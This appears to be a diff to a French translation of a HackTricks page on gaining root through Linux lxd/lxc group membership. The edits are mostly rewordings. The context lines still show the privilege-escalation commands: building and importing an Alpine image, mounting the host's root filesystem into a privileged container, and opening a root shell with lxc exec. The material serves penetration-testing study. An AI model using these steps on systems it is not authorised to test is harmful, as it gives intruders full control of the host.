@@ -1,14 +1,16 @@
-# Groupe lxd/lxc - Élévation de privilèges
+# Groupe lxd/lxc - Privilege escalation
 
-L'appartenance au groupe de gestion LXD de l'hôte (normalement _**lxd**_) peut fournir un moyen d'obtenir les privilèges root en permettant un contrôle total du daemon.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
 
-## Exploitation sans Internet
+L'appartenance au groupe de gestion LXD de l'hôte (normalement _**lxd**_) peut fournir un chemin vers root en permettant un contrôle total du daemon.<sup>[[1]](#references)</sup>
+
+## Exploiting without internet
 
 ### Method 1
 
-Vous pouvez télécharger une image Alpine à utiliser avec LXD depuis un repository de confiance.  
-Le serveur d'images LXD de Canonical publie des builds quotidiens : [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-Récupérez simplement **lxd.tar.xz** et **rootfs.squashfs** du build le plus récent (le nom du répertoire correspond à la date).<sup>[[8]](#references)</sup>
+Vous pouvez télécharger une image Alpine à utiliser avec LXD depuis un repository de confiance.
+Le serveur d'images LXD de Canonical publie des builds quotidiens : [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Récupérez simplement **lxd.tar.xz** et **rootfs.squashfs** depuis le build le plus récent (le nom du répertoire correspond à la date).<sup>[[8]](#references)</sup>
 
 Vous pouvez également installer distrobuilder sur votre machine en suivant les [instructions du projet](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
@@ -50,9 +52,9 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > Si vous rencontrez cette erreur _**Error: No storage pool found. Please create a new storage pool**_\
-> Exécutez **`lxd init`**, configurez un storage pool par défaut, puis **répétez** le chunk précédent de commandes.<sup>[[2]](#references)</sup>
+> Exécutez **`lxd init`**, configurez un storage pool par défaut, puis **répétez le bloc de commandes précédent**.<sup>[[2]](#references)</sup>
 
-Enfin, démarrez le container et ouvrez un shell root sur le système de fichiers de l’hôte :<sup>[[1]](#references)[[2]](#references)</sup>
+Enfin, démarrez le conteneur et ouvrez un shell root sur le système de fichiers de l’hôte :<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Méthode 2
 
-Construisez une image Alpine et démarrez-la avec le flag `security.privileged=true`, ce qui mappe le root du container vers le root de l’hôte ; monter `/` expose ensuite le système de fichiers de l’hôte dans le container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+Construisez une image Alpine et démarrez-la avec le flag `security.privileged=true`, ce qui mappe le root du container sur le root de l’hôte ; monter `/` expose alors le système de fichiers de l’hôte à l’intérieur du container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -88,7 +90,7 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 - [4] [distrobuilder](https://github.com/lxc/distrobuilder)
 - [5] [Comment créer des images avec distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
 - [6] [Définition d’image Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
-- [7] [Script de build lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [7] [Script de build de lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
 - [8] [Serveur d’images LXD](https://images.lxd.canonical.com/)
 - [9] [Type : disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
